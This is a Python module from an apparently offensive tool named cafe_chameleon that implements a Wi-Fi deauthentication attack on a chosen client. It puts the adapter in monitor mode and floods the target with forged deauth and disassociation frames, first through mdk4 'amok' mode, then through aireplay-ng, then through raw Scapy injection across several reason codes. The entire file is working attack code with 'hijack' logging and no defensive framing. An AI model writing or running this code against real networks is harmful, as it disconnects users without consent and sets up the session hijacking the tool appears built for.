"""
cafe_chameleon.network.deauth - Airgeddon MDK4 Amok Deauthentication & Disassociation Engine (802.11 Monitor Mode).
"""

import logging
import shutil

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from cafe_chameleon.utils.process import _run
from cafe_chameleon.ui.console import log_hijack
from cafe_chameleon.scanners.air_scanner import get_monitor_interface, set_monitor_mode, set_managed_mode


def is_monitor_mode_active(iface: str) -> bool:
    """Checks if the given interface or system has an active 802.11 monitor interface."""
    rc, out = _run(f"iw dev {iface} info", debug=False)
    if "type monitor" in out.lower():
        return True
    mon = get_monitor_interface(iface)
    if mon != iface:
        rc, out_mon = _run(f"iw dev {mon} info", debug=False)
        return "type monitor" in out_mon.lower()
    return False


def send_deauth(target_mac: str, bssid: str | None, interface: str = "wlan0", count: int = 30, channel: int | None = None) -> bool:
    """
    Airgeddon MDK4 Amok Deauthentication & Disassociation Engine in 802.11 Monitor Mode.
    
    1. Detects active monitor interface (e.g. wlan0mon). If not active, switches to monitor mode.
    2. Tunes monitor interface to target channel using iw.
    3. Runs mdk4 'd' (Deauth/Disassoc Amok Mode) with -b (Blacklist target client MAC) and -s (packet rate).
    4. Falls back to aireplay-ng --deauth if mdk4 is absent/fails.
    5. Falls back to Scapy raw 802.11 Deauth + Disassoc frame injection with reason codes (1, 2, 6, 7).
    6. Safely restores Managed Mode if monitor mode was temporarily switched for deauth.
    """
    if not target_mac or target_mac.lower() in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
        return False

    bssid_target = bssid if bssid else "ff:ff:ff:ff:ff:ff"
    switched_monitor = False
    mon_iface = interface

    # 1. Ensure 802.11 Monitor Mode
    if not is_monitor_mode_active(interface):
        log_hijack(f"[*] Switching {interface} to 802.11 MONITOR mode for Airgeddon Amok Deauth...")
        mon_iface = set_monitor_mode(interface)
        switched_monitor = True
    else:
        mon_iface = get_monitor_interface(interface)

    # 2. Channel Lock
    if channel:
        _run(f"iw dev {mon_iface} set channel {str(channel)}", debug=False)

    log_hijack(f"[*] [Airgeddon MDK4 Amok] Transmitting Deauth & Disassoc frames to {target_mac} (BSSID: {bssid_target})...")

    success = False

    # Method 1: MDK4 Deauthentication / Disassociation Amok Attack (Airgeddon standard)
    if shutil.which("mdk4"):
        try:
            # Create temporary target blacklist file for mdk4 -b
            import tempfile
            with tempfile.NamedTemporaryFile("w", delete=False) as tf:
                tf.write(f"{target_mac}\n")
                tmp_target_file = tf.name

            # Airgeddon MDK4 Amok syntax: mdk4 <iface> d -B <bssid> -b <target_file> -s 100
            cmd = ["mdk4", mon_iface, "d", "-B", bssid_target, "-b", tmp_target_file, "-s", "100"]
            if channel:
                cmd.extend(["-c", str(channel)])

            # Run MDK4 amok deauth burst for 3 seconds
            _run(cmd, debug=False, timeout=3.0)
            log_hijack(f"\033[92m[+] MDK4 Amok Deauth/Disassoc burst completed on {target_mac}\033[0m")
            success = True
        except Exception as e:
            log_hijack(f"[-] MDK4 execution failed: {e}")

    # Method 2: Aireplay-ng Deauthentication Fallback
    if not success and shutil.which("aireplay-ng"):
        try:
            cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid_target]
            if target_mac.lower() != "ff:ff:ff:ff:ff:ff":
                cmd.extend(["-c", target_mac])
            cmd.append(mon_iface)
            rc, _ = _run(cmd, debug=False, timeout=4.0)
            if rc == 0:
                log_hijack(f"\033[92m[+] aireplay-ng deauth burst completed on {target_mac}\033[0m")
                success = True
        except Exception:
            pass

    # Method 3: Scapy Raw 802.11 Monitor Mode Frame Injection (Deauth + Disassoc across Reason Codes)
    if not success:
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp
            reason_codes = [1, 2, 6, 7]  # Unspecified, Prev Auth Invalid, Class2 NonAuth, Class3 NonAssoc
            for reason in reason_codes:
                # Deauth Frame (subtype 12)
                pkt_deauth = RadioTap() / Dot11(addr1=target_mac, addr2=bssid_target, addr3=bssid_target) / Dot11Deauth(reason=reason)
                # Disassoc Frame (subtype 10)
                pkt_disas = RadioTap() / Dot11(addr1=target_mac, addr2=bssid_target, addr3=bssid_target) / Dot11Disas(reason=reason)

                sendp(pkt_deauth, iface=mon_iface, count=10, inter=0.005, verbose=False)
                sendp(pkt_disas, iface=mon_iface, count=10, inter=0.005, verbose=False)

            log_hijack(f"\033[92m[+] Scapy 802.11 Monitor Deauth/Disassoc injected for {target_mac}\033[0m")
            success = True
        except Exception as e:
            log_hijack(f"[-] Deauth frame injection exception: {e}")

    # 3. Restore Managed Mode if temporarily switched
    if switched_monitor:
        log_hijack(f"[*] Restoring {interface} to MANAGED mode for connection verification...")
        set_managed_mode(interface)

    return success
